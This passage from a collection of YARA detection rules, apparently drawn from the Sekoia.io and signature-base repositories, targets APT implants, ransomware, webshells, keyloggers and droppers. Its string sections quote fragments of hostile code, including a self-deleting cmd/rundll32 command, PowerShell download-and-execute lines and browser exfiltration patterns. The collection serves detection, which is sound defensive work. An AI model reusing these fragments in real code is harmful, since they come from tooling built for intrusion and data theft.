		$ = "cmd /c timeout /t 10 & Del /f /q \"%s\" & attrib -s -h \"%s\" & rundll32 \"%s\" #1" wide

	condition:
		3 of them
}

rule SEKOIA_Apt_Polonium_Powershell_Creepydrive_Strings
{
	meta:
		description = "Detects POLONIUM CreepyDrive Powershell implant"
		author = "Sekoia.io"
		id = "0ba196bd-9cd6-4553-b7bf-69989cdb8be4"
		date = "2022-06-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_polonium_powershell_creepydrive_strings.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "28b8f10a36d13e97e606b082f20c50c3d48241409e7f1aca621e2af9d756dbe5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "function Exec($comm)" base64 ascii wide
		$ = "$comm = $comm + \"| outstring" base64 ascii wide
		$ = "Invoke-Expression -Command:$comm" base64 ascii wide
		$ = "microsoft.com" base64 ascii wide
		$ = "$req = Invoke-WebRequest" base64 ascii wide
		$ = "$j += $data" base64 ascii wide
		$ = "$res = Exec($arr[$i])" base64 ascii wide
		$ = "$arr = @(iex \"$req\")" base64 ascii wide
		$ = "elseif ($req -cmatch" base64 ascii wide
		$ = "graph.microsoft.com" base64 ascii wide

	condition:
		3 of them
}

rule SEKOIA_Tool_Pivotnacci
{
	meta:
		description = "Detects Pivotnacci"
		author = "Sekoia.io"
		id = "31ecb08a-fc92-4cbe-a865-7ce869a5fa6a"
		date = "2024-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_pivotnacci.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b0e4bc997775fb5ff258a23e07a58b4897a2ce9d3fffab86e93919857e566d18"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$pivotnacci = "pivotnacci"
		$s1 = "Socks server => %s:%s"
		$s2 = "The default listening address"
		$s3 = "Socks server for HTTP agents"
		$s4 = "Message returned by the agent web page"
		$s5 = "Password to communicate with the agent"
		$s6 = "To specify agent type in case is not automatically detected."

	condition:
		$pivotnacci and 3 of ( $s* )
}

rule SEKOIA_Backdoor_Oyster
{
	meta:
		description = "Detects files related to the Oyster backdoor."
		author = "Sekoia.io"
		id = "f95f98ea-1e52-45ae-8abf-a986f95d4ab2"
		date = "2024-08-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/backdoor_oyster.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "ffd84d0c7064bcd69121aa606bc642ff2b5c9927ba622260a02a9689c7ab8878"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "CleanUp30.dll" ascii fullword
		$s2 = "MSTeamsSetup_c_l_.exe" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Latrodectus_Br4_Js_Dropper
{
	meta:
		description = "Detect the JS script used to drop Latrodectus"
		author = "Sekoia.io"
		id = "042a598d-66fa-4994-a793-228355abd5dd"
		date = "2024-06-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/latrodectus_br4_js_dropper.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a835bd9a9ad68fd2f285ec5c04a5c78ba5ca85381ff30048ac375bef220fd72f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = " installer.InstallProduct(msiPath);" ascii
		$s2 = "new ActiveXObject(\"WindowsInstaller.Installer\");" ascii

	condition:
		all of them
}

rule SEKOIA_Downloader_Kimsuky_Lnk
{
	meta:
		description = "Detect Kimsuky LNK"
		author = "Sekoia.io"
		id = "3831d115-7874-4bc9-aeb4-d2cb9bc2b5c9"
		date = "2024-07-16"
		modified = "2024-12-19"
		reference = "https://blogs.jpcert.or.jp/en/2024/07/attack-activities-by-kimsuky-targeting-japanese-organizations.html"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_kimsuky_lnk.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3512c8c21203a015b316c2a993db1a8c10420df06ea97d84a6e350550a628230"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "3065b8e4bb91b4229d1cea671e8959da8be2e7482067e1dd03519c882738045e"
		hash2 = "d912f49d24792aa7197509f76e2097ac3858cde23199e1b40f2516948d39c589"
		hash3 = "e936445935c4a636614f7113e4121695a5f3e4a6c137b7cdcceb6f629aa957c4"
		hash4 = "fe156159a26f8b7c140db61dd8b136e1c8103a800748fe9b70a3a3fdf179d3c3"

	strings:
		$ = "AType: Text Document" wide
		$ = "Size: 5.23 KB" wide
		$ = "Date modified: 01/02/2020 11:23" wide

	condition:
		all of them
}

rule SEKOIA_Koi_Powershell_Loading_Obfuscatednet
{
	meta:
		description = "Powershell script loading obfuscated .NET Koi module"
		author = "Sekoia.io"
		id = "75a7460d-cc28-470e-9841-da8e46ee0101"
		date = "2024-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/koi_powershell_loading_obfuscatednet.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "82f30c04474ea77af5169771a2c0e75ba792fd32dc559b8c29172b73ace4ef10"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "# [Net.ServicePointManager]::SecurityProtocol +='tls12'"
		$s2 = "$binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]"
		$s3 = "\").Split('|')"
		$s4 = "$ep.Invoke($null, "

	condition:
		$s3 and 3 of them
}

rule SEKOIA_Ransomware_Win_Shrinklocker
{
	meta:
		description = "Detects files related to the ShrinkLocker ransomware"
		author = "Sekoia.io"
		id = "93a6fbdd-ad62-456a-a1a5-b5ae3b242004"
		date = "2024-06-07"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_shrinklocker.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "7770b0946b9bb482f23c4ce0d753393e0d42a6fd8b31029847d74356296f0cf1"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$a = "shrinkdisk" ascii fullword
		$b = "BitLocker" ascii fullword
		$c = "diskpart" ascii fullword
		$d = "disk.vbs" ascii fullword
		$e = "strDriveLetter" ascii fullword
		$f = "shrinkcomplate" ascii fullword
		$g = "ADODB.Stream" ascii fullword
		$h = "Win32_OperatingSystem" ascii fullword
		$i = "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" ascii fullword
		$j = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii fullword
		$k = "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE" ascii fullword

	condition:
		9 of them
}

rule SEKOIA_Apt_Reaper_2Fa_Phishing_Webpage
{
	meta:
		description = "Detects Reaper 2FA phishing webpage"
		author = "Sekoia.io"
		id = "348ca2ad-c8f9-4aed-8a27-95caa3a34f4b"
		date = "2023-03-09"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_reaper_2fa_phishing_webpage.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3f0ae0b35ea181b4712feeb34e866519921917179297148982e5298df9f133a9"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "setTimeout(checkUpload,"
		$ = "commChannel.addListener("
		$ = "else if(commType =="
		$ = "?dir=DOWN&method=READ&id="
		$ = "Content : base64_encode(upload_data)"
		$ = "$.post(upHttpRelayer"
		$ = "var ablyUpData = {"
		$ = "initComm();"
		$ = "function Next(arg) {"

	condition:
		3 of them
}

rule SEKOIA_Apt_Unc4990_Explorer_Ps1
{
	meta:
		description = "Detects powershell script (explorer.ps1)"
		author = "Sekoia.io"
		id = "2e1abbbf-f9b7-4147-b7da-3544cbc4a5f1"
		date = "2024-02-01"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unc4990_explorer_ps1.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5085f738e23b801c7e36408d189755086d91c0bb266af6738c80510eb85e598f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = "$(get-location).Path"
		$s1 = "+ \"\\Runtime Broker.exe"
		$s2 = "Start-Process -FilePath"
		$s3 = "-Wait;"
		$s4 = "Start-Sleep -s"

	condition:
		all of them and @s3- @s2 < 35
}

rule SEKOIA_Apt_Apt37_Chinotto_Powershell_Variant
{
	meta:
		description = "Detects APT37 Chinotto Powershell Variant"
		author = "Sekoia.io"
		id = "fa42b225-58fe-4e00-b84b-df37491d8fdd"
		date = "2023-03-06"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt37_chinotto_powershell_variant.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b4d17467f15d52bd615e335fa8bc31381ec273b67dabb74655f47179f04f631f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$env:COMPUTERNAME + '-' + $env:USERNAME;" ascii wide
		$ = "while($true -eq $true)" ascii wide
		$ = "Start-Sleep -Seconds" ascii wide
		$ = " -ne 'null' -and $" ascii wide
		$ = "= 'R=' + [System.Convert]::" ascii wide
		$ = "[string]$([char]0x0D) + [string]$([char]0x0A);" ascii wide

	condition:
		4 of them
}

rule SEKOIA_Ransomware_Win_Raworld
{
	meta:
		description = "Detects files related to stage 1 of a campaign from the ransomware group RA World."
		author = "Sekoia.io"
		id = "a9ed9c5a-7a0e-4c2e-90f4-d52f5589b2b8"
		date = "2024-07-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_raworld.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "583dd2ea8e20a87d0b67783d1dd59212eb133de1f945d5b4afad89e8a5017d35"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Loder.exe" ascii fullword
		$s2 = "Stage2.exe" wide
		$s3 = "SYSVOL" wide
		$s4 = "Finish.exe" wide
		$s5 = "Exclude.exe" wide
		$s6 = "Stage3.exe" wide
		$s7 = "Pay.txt" ascii fullword
		$s8 = "RA World" ascii fullword
		$s9 = "Stage1.exe" ascii fullword

	condition:
		4 of them
}

rule SEKOIA_Keylogger_Win_Donot
{
	meta:
		description = "Detect the DoNot's keylogger malware"
		author = "Sekoia.io"
		id = "4f67dda7-da68-4496-a8b4-a8a769ddd763"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/keylogger_win_donot.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "eb935f84335e934346511b4108f70df469deef6ecaaba809c144197c04a28f64"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "iwrct2mTFAu0ew1nyqQgoaNtNo0+52R0XiTKbwy1W48Bn1b2YcNt0+tptyY6oGoAeLDGekM/yHcdikNGi8bLqkUQ8CIdkWeT3QiympOTfjs="
		$ = "ZmVwZW9kbWZ2c24ucHMuZ3h4LngweXBvdWpkYm1qcXE7YnFmVXp1LmZvb3VEcA=="

	condition:
		1 of them
}

rule SEKOIA_Apt_Kimsuky_Sharptongue_C2_Source
{
	meta:
		description = "Detects the PHP code of the SharpTongue C2"
		author = "Sekoia.io"
		id = "a2ccf773-511c-4088-8bcf-b923291d024b"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharptongue_c2_source.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c301a99876cfe2863546c990654aa922f9327e0eb010968eaea43f1d8ced76da"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<?php"
		$ = "foreach($_GET as $variable => $value)"
		$ = "$chk=$value"
		$ = "base64_encode($ip)"

	condition:
		all of them
}

rule SEKOIA_Tool_Xiebroc2_Strings
{
	meta:
		description = "Detects XiebroC2 based on strings"
		author = "Sekoia.io"
		id = "8451878e-5371-440b-b8ac-f9e6f7643d3c"
		date = "2024-09-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_xiebroc2_strings.yar#L1-L40"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "84e665bcbf963a2cf67d879aa3422d79"
		hash = "3558c376420724694ba244a2e2acd20c"
		hash = "e29fb9cd825db51a7a2e519f188e61ba"
		hash = "a3b31739ad5eed51277c8478a83160a3"
		hash = "d6e2499ea7fe8f047da1a95dae16d2c3"
		hash = "1616818b65bf49d985bb1816461a4a75"
		hash = "2e72d3ef2492088a4623d77d5e419ab8"
		hash = "351770f860507d652ec3644ed1988f7f"
		hash = "58fa6ad96028753ba8b0b0ed8fa6dccb"
		hash = "607b541525b27eeefbef1455397bff35"
		hash = "c2a242612468814e2e951e4db3762059"
		hash = "431e275f4e43ec4ef7c2cc8ba126e9d3"
		hash = "ace54bd32c226a7b9a6d4d53791e4021"
		hash = "f22c21ed7bba1ddfc42ffdc66da3a4dd"
		hash = "9a5ff9e07ed04cb0e71102cf1aae380c"
		hash = "d20e01a1af3f40a7a9646d7e7df1b42e"
		hash = "5544b621c9772cd32c4db77a0e59515a"
		logic_hash = "f3be31e0f1ad8e8bce132d861de5068340653547d786378f9b8045382f40939f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RemarkClientColor"
		$s2 = "HandlePacket"
		$s3 = "-hide"
		$s4 = "Failed to send data:"
		$s5 = "Pac_ket"
		$s6 = "WANip"
		$s7 = "%s %s && Kernel: %s"
		$g1 = "go.buildid"
		$g2 = "dep    golang.org"

	condition:
		3 of ( $s* ) and any of ( $g* )
}

rule SEKOIA_Spyware_And_Bahamut
{
	meta:
		description = "Detect Bahamut's spyware based on common information gathering function names"
		author = "Sekoia.io"
		id = "d416997e-baf1-412c-bf39-905a6e19b65e"
		date = "2022-11-23"
		modified = "2024-12-19"
		reference = "https://www.welivesecurity.com/2022/11/23/bahamut-cybermercenary-group-targets-android-users-fake-vpn-apps/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/spyware_and_bahamut.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5f44c938fed9b32eaf183be979a67e0c7fde409e72875359105ad7ffb393893d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "c51dc2132c830c560aaeae4bf48e5f0d28c84b36d27840b5c2ba170d87f4afa5"
		hash2 = "d7e2cf642b236dba9ba0cbe5a9dc28baf22477973d5ce163e21ec40f5f26e078"

	strings:
		$ = "FbDao"
		$ = "SignalDao"
		$ = "conionDao"

	condition:
		all of them
}

rule SEKOIA_Webshell_Wso_Webshell_Strings
{
	meta:
		description = "Detects the WSO webshells"
		author = "Sekoia.io"
		id = "84340792-73a4-4d61-9957-6cfa1f6444a7"
		date = "2022-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/webshell_wso_webshell_strings.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "4d6966a34dc8e7390913857144da106affea14668d1c2c11a05be62a6e625c8f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "decrypt($str,$pwd){$pwd=base64_encode($pwd);"
		$ = "prototype(md5($_SERVER['HTTP_HOST'])"
		$ = "$_COOKIE[md5($_SERVER['HTTP_HOST'])."
		$ = "set(a,c,p1,p2,p3,charset)"
		$ = "(($p & 0x0008) ? (($p & 0x0400)"
		$ = "gcc','lcc','cc','ld','make','php"

	condition:
		3 of them
}

rule SEKOIA_Apt_Uta0178_Javascript_Inclusion_Strings
{
	meta:
		description = "Detects UTA0178 malicious inclusion strings"
		author = "Sekoia.io"
		id = "af816c35-1f00-47ea-86ee-c034607c625e"
		date = "2024-01-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_uta0178_javascript_inclusion_strings.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3fedf49417178df374d6ae20e57ffcfa00cb68a647769964c049d9a8e0f4958"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = ".value"
		$s1 = "btoa("
		$s2 = "https://"
		$s3 = "new XMLHttpRequest();"
		$s4 = ".send(null);"

	condition:
		@s0< @s1 and @s1 < @s2 and @s2 < @s3 and @s3 < @s4 and @s4- @s0 < 350
}

rule SEKOIA_Apt_Spikedwine_Malicious_Hta
{
	meta:
		description = "Detects malicious HTA used by SPIKEDWINE"
		author = "Sekoia.io"
		id = "e4526142-d98a-bf35-9d2c-ca2e83638c4b"
		date = "2024-02-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_spikedwine_malicious_hta.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "305896cde5d95c29de511541a961063730709d40d67a8788f084c17f181e3baf"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID=" nocase
		$ = "return _0x"
		$ = "font-size: 18px;"

	condition:
		all of them
}

rule SEKOIA_Downloader_Win_Donot
{
	meta:
		description = "Detect the DoNot's downloader malware. There are big binaries in downloader strings."
		author = "Sekoia.io"
		id = "31b153cc-a4b9-40a0-8bcb-ce1370645b4b"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_donot.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f6a03e6cfda74c1fbb1e8939a66735498d604a821b8b51492c2c5c6a46a38b6e"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "001100000011000100110001001100000011000000110000001100010011000100110000001100010011000100110000001100010011000100110000001100010011"
		$ = "01010011011011110110011001110100011101110110000101110010011001010101110001001101011010010110001101110010011011110111001101101111011001100111010001011100010101110110100101101110011001000110111101110111011100110101110001000011011101010111001001110010011001010110111001110100010101100110010101110010011100110110100101101111011011100101110001010101011011100110100101101110011100110111010001100001011011000110110000000000"
		$ = "0101110001110011011110010111001101110100011001010110110100110011001100100101110001110010011101010110111001100100011011000110110000110011001100100010111001100101011110000110010100000000"

	condition:
		1 of them
}

rule SEKOIA_Clipper_Win_Atlas_Strings
{
	meta:
		description = "Detects Atlas Clipper"
		author = "Sekoia.io"
		id = "f08c6af6-c325-4f7d-8686-575b25550d6a"
		date = "2023-07-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/clipper_win_atlas_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c8ad062b69dfe996a488ee9c79f0e7e0016f57f5b54fc39aeb4e207d2a42aa75"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "C:/Users/box/Desktop/ATLAS/ATLAS/main.go" ascii
		$s2 = "ATLAS Clipper" ascii
		$s3 = "Victim: %s" ascii
		$s4 = "Attacker: %s" ascii
		$s5 = "Install Path: %s" ascii
		$s6 = "HWID: %s" ascii
		$s7 = "Install Date: %s" ascii
		$s8 = "https://t.me/atlasclipper_channel" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_NFS_Fuse_NFS
{
	meta:
		description = "Detects the nfs-security-tooling fuse_nfs by HvS Consulting"
		author = "Moritz Oettle"
		id = "287fbe7d-ee1c-58a4-aa2d-9d9bec8321b4"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L1-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bd3714b865d77660404e5f3ed1e9c7b55aadc6f58d16761111be57597784686"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "NFS3ConnectionFactory" fullword ascii
		$s2 = "fuse_to_nfs_timestamp" fullword ascii
		$s3 = "--manual-fh" fullword ascii
		$s4 = "--fake-uid-allow-root" fullword ascii
		$s5 = "nfs.rpc.credential" fullword ascii
		$s6 = "nfs.readlink" fullword ascii
		$s7 = "pyfuse3.EntryAttributes" fullword ascii
		$s8 = "Make nested exports on NetApp servers work" fullword ascii
		$s9 = "add_mutually_exclusive_group" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_HKTL_NFS_NFS_Analyze
{
	meta:
		description = "Detects the nfs-security-tooling nfy_analyze by HvS Consulting"
		author = "Marc Stroebel"
		id = "3350d0ae-e638-5c8f-a578-ba0ac5521053"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L26-L53"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "83a9e5b5b404bf28b0334611fe4f38227212783cecea3c9996d23cb00cad42ed"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "no_root_squash_exports" fullword ascii
		$s2 = "nfs lock manager" fullword ascii
		$s3 = "netapp partner" fullword ascii
		$s4 = "xdrdef.mnt3_type" fullword ascii
		$s5 = "BTRFS subvolumes" fullword ascii
		$s6 = "Unsupported fsid" fullword ascii
		$s7 = "nfs3_read_etc_shadow" fullword ascii
		$s8 = "nfs3_check_no_root_squash" fullword ascii
		$s9 = "krb5i" fullword ascii
		$s10 = "nfs4_overview" fullword ascii
		$s11 = "--btrfs-subvolumes" fullword ascii
		$s12 = "when escaping a BTRFS export" fullword ascii
		$s13 = "No NFS server detected" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_Dropper
{
	meta:
		description = "Strings from PowerShell dropper of CSharp version of Agent"
		author = "Fox-IT SRT"
		id = "833ce607-56a9-5580-bbd1-e72392945fec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L24-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "19f56e69685ae8c13b9dd884f8322915835c16e2c6313f01f9fa447218419108"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "function format([string]$source)"
		$b = "foreach($c in $bb){$tt = $tt + [char]($c -bxor"
		$c = "[agent]::Main($args);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from Agent CSharp version"
		author = "Fox-IT SRT"
		id = "14e1702d-6229-5989-8bb7-cc9c0c321676"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L40-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "bcf9a75dbbf90044db76c56ffd07971d4252b0e75d73abf402ca4fadbfb59767"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "LFNVT0hBBnVfVVJDSx0sU1VPSEEGdV9VUkNLCG9pHSxTVU9IQQZ1X1VSQ0sIZUlK"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Py_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from Agent Python version"
		author = "Fox-IT SRT"
		id = "eb2701e9-4358-5d24-bfcd-b4dde24f13bf"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L77-L89"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "279fb27637d9b62b484283f778215d042de9fb83110a233e048452e921c540ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "QlpoOTFBWSZTWWDdHjgABDTfgHwQe////z/v/9+////6YA4cGPsAl2e8M9LSU128"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Keylogger_Py
{
	meta:
		description = "Strings from Python keylogger"
		author = "Fox-IT SRT"
		id = "f7b5ec1b-669e-5e7d-a9d3-011d212eb363"
		date = "2023-12-05"
